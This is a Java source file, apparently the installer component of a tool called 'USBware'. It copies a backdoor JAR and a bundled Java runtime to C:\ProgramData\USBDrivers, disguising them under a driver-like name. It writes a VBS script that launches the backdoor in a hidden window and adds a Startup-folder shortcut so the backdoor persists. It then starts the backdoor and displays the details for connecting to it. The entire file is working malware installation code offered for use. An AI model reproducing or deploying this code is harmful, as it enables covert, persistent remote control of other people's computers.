package com.github.thatcherdev.usbware.install;

import java.io.File;
import java.io.PrintWriter;
import javax.swing.JOptionPane;
import org.apache.commons.io.FileUtils;
import com.github.thatcherdev.usbware.backend.Utils;
import mslinks.ShellLink;

public class Install {

	/**
	 * Installs backdoor to 'C:\ProgramData\USBDrivers'. Attempts to add backdoor to
	 * startup. Starts backdoor. Displays WiFi and backdoor information.
	 * 
	 * @param args
	 */
	public static void main(String[] args) {
		String disp="";
		try{
			if(new File("resources\\jre").isDirectory() && (new File("resources\\jre\\bin").isDirectory() && new File("resources\\jre\\lib").isDirectory()))
				FileUtils.copyDirectory(new File("resources\\jre"), new File("C:\\ProgramData\\USBDrivers\\jre"));
			FileUtils.copyDirectory(new File("resources\\scripts"), new File("C:\\ProgramData\\USBDrivers\\scripts"));
			FileUtils.copyFile(new File("resources\\backdoor.jar"), new File("C:\\ProgramData\\USBDrivers\\USBDrivers.jar"));
			PrintWriter out=new PrintWriter(new File("C:\\ProgramData\\USBDrivers\\USBDrivers.vbs"));
			out.println("Set objShell = WScript.CreateObject(\"WScript.Shell\")\nobjShell.Run \"cmd /c \"\" c: & "
				+"cd C:\\ProgramData\\USBDrivers & if exist jre\\ (jre\\bin\\java -jar USBDrivers.jar) else (java -jar USBDrivers.jar)\", 0, True");
			out.flush();
			out.close();
			FileUtils.copyFile(new File("resources\\ip.txt"), new File("C:\\ProgramData\\USBDrivers\\ip.txt"));
			try{
				ShellLink.createLink("C:\\ProgramData\\USBDrivers\\USBDrivers.vbs", "C:\\Users\\"+System.getProperty("user.name")
					+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\USBDrivers.lnk");
			}catch(Exception e){
				disp+="Could not add backdoor to startup\n\n";
			}
			Utils.runCommand("cmd /c start C:\\ProgramData\\USBDrivers\\USBDrivers.vbs");
			disp+="Backdoor installed and running!\n\nTo control backdoor, connect to:\n"+Utils.currentConnection()+"\nand run option 1 in USBware";
		}catch(Exception e){
			disp="An error occurred:\n"+e.getMessage();
		}finally{
			JOptionPane.showMessageDialog(null, disp, "Backdoor control information", JOptionPane.INFORMATION_MESSAGE);
		}
	}
}